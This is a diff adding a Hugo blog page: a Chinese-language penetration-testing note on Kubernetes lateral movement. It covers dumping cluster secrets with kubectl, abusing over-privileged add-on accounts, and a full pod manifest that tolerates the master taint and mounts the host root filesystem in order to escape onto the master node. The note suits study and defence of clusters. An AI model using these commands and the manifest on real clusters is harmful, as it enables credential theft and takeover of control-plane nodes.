@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>k8s渗透-横向移动 | My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+  <h1>k8s渗透-横向移动</h1>
+
+  
+  
+  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>
+
+  <h1 id="k8s渗透-横向移动">k8s渗透-横向移动</h1>
+<h2 id="窃取凭证">窃取凭证</h2>
+<h3 id="kubeconfig凭证">kubeconfig凭证</h3>
+<p>kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 <a href="https://www.cnblogs.com/yuy0ung/articles/19031290">k8s渗透-初始访问</a> 笔记中已经介绍了，这里不再说明</p>
+<h3 id="secret对象">secret对象</h3>
+<p>在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubeconfig get secrets -A
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png" alt="QQ_1757151099118"></p>
+<p>查看指定secret内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config -n <span style="color:#f92672">[</span>指定命名空间<span style="color:#f92672">]</span> get secret <span style="color:#f92672">[</span>secret名称<span style="color:#f92672">]</span> -o yaml
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png" alt="QQ_1757151463832"></p>
+<p>可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了</p>
+<h2 id="集群内网渗透">集群内网渗透</h2>
+<p>K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段</p>
+<h2 id="第三方组件风险">第三方组件风险</h2>
+<p>在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸</p>
+<p>简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群</p>
+<h2 id="污点taint横向">污点（taint）横向</h2>
+<p>这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限</p>
+<p>污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上</p>
+<p>其中污点有三种属性(效果)：</p>
+<blockquote>
+<ol>
+<li><strong>NoSchedule</strong>：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。</li>
+<li><strong>PreferNoSchedule</strong>：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 <code>PreferNoSchedule</code> 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。</li>
+<li><strong>NoExecute</strong>：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，<code>NoExecute</code> 污点会导致 Pod 被终止并迁移到其他节点。</li>
+</ol>
+</blockquote>
+<p>一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点</p>
+<p>比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat &gt; x.yaml <span style="color:#e6db74">&lt;&lt; EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: control-master-x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  tolerations:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - key: &#34;node-role.kubernetes.io/master&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    operator: &#34;Exists&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    effect: &#34;NoSchedule&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: control-master-x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: ubuntu:18.04
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;/bin/sleep&#34;, &#34;3650d&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    volumeMounts:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: master
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      mountPath: /master
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  volumes:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: master
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hostPath:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      path: /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      type: Directory
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点</p>
+<h2 id="其他横向">其他横向</h2>
+<p>之前笔记中提到的权限提升阶段的逃逸手法也能用于横向移动，另外，在高权限情况下接管dashboard也能直接在面板下发指令，实现横向</p>
+<h2 id="总结">总结</h2>
+<p>可以看到k8s的横向方式都是换汤不换药，无非基于服务、凭证、逃逸、常规内网横向，很多问题都是管理员配置不当产生</p>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
